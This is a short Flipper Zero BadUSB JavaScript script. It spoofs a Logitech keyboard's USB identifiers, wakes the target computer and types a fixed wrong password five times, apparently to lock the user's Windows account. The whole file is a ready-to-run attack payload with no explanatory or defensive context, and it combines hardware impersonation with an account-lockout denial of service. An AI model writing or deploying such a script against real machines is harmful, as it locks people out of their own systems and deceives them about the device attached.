let badusb = require("badusb");
let layout = "fr-FR";
let tryBeforeLockAccount = 5;
let passwordTry = "P4wn3d";

// configure the keyboard to connect
badusb.setup({ vid: 0x046d, pid: 0xc33f, mfr_name: "Logitech, Inc", prod_name: "Keyboard", layout_path: "/ext/badusb/assets/layouts/" + layout + ".kl" });

print("Waiting for connection to computer");
while (!badusb.isConnected()) {
    delay(500);
}

// for windows: unlock the visibility of password field
print("Unsleep computer");
badusb.press("SPACE");
delay(2000);
// send key to computer
print("Send ", tryBeforeLockAccount," wrong password");

for (let i = 0; i < tryBeforeLockAccount; i++) {
	print("Try number ", i+1);
	badusb.print(passwordTry);
	badusb.press("ENTER");
	delay(2000);
}

// End
delay(100);
badusb.quit();
print("Commands send to computer");